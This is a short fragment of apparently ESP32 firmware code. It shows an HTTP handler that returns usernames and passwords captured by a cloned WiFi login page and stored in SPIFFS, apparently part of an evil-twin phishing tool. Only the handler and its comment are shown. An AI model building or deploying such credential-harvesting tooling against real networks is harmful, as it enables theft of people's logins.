...
/**
 * @brief Handle get_password POST request and return the saved credentials from SPIFFS 
 * Displays saved username and password from cloned WiFi login
 * 
 * @param req 
 * @return esp_err_t 
 */
...
{
    // Get credentials (username + password) from cloned WiFi login
    password_manager_read_credentials(req);
    return ESP_OK;
}
